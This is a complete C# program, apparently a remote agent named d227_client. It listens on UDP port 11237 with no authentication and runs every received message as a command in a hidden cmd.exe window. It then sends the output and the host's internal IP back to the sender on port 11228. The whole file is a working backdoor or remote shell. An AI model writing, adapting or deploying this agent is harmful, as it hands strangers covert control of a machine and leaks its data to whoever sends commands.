using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace d227_client
{
    class MessageObject
    {
        public String ip;
        public String message;
        public String port;
        public MessageObject(String ip, String port, String message)
        {
            this.ip = ip;
            this.port = port;
            this.message = message;
        }
    }

    class Program
    {
        static ConcurrentQueue<MessageObject> commands = new ConcurrentQueue<MessageObject>();
        static ConcurrentQueue<MessageObject> results = new ConcurrentQueue<MessageObject>();

        static void Main(string[] args)
        {

            Task.Factory.StartNew(sendResult);
            Task.Factory.StartNew(runCommand);

            UdpClient receiveUdpClient = new UdpClient(11237);
            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);
            while (true)
            {
                try
                {
                    Byte[] receiveBytes = receiveUdpClient.Receive(ref RemoteIpEndPoint);
                    String returnData = Encoding.UTF8.GetString(receiveBytes);
                    String ip = RemoteIpEndPoint.Address.ToString();
                    String port = RemoteIpEndPoint.Port.ToString();
                    MessageObject msg = new MessageObject(ip, port, returnData);
                    commands.Enqueue(msg);
                }
                catch (Exception e)
                { }
            }
        }

        private static void runCommand()
        {
            MessageObject commandobj;
            while (true)
            {
                if (commands.TryDequeue(out commandobj))
                {
                    Task.Factory.StartNew(() => runCMD(commandobj));
                }
                Thread.Sleep(1000);
            }
        }

        private static void runCMD(MessageObject commandobj)
        {
            String command = commandobj.message;
            command = command.Replace("fea0bc7a-db7d-11e5-ba09-bba04f01750d", "68ce0052-61be-11e5-83f2-fcccea493ebd");                                                                     
            Console.Write("命令执行:\n" + command);
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardInput.WriteLine(command);
            p.StandardInput.WriteLine("exit");
            String result = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Close();
            MessageObject msg = new MessageObject(commandobj.ip, commandobj.port, result);
            results.Enqueue(msg);
        }

        private static void sendResult()
        {
            MessageObject sendobj;
            while (true)
            {
                if (results.TryDequeue(out sendobj))
                {
                    String result = GetInternalIP() + ":\t\t\n" + sendobj.message;
                    String ip = sendobj.ip;
                    String port = sendobj.port;
                    UdpClient sendUdpclient = new UdpClient(ip, 11228);
                    byte[] sendByte = Encoding.UTF8.GetBytes(result);
                    sendUdpclient.Send(sendByte, sendByte.Length);
                    Console.WriteLine("结果发送成功");
                }
                Thread.Sleep(1000);
            }
        }

        //获取内网IP
        private static string GetInternalIP()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }
    }
}
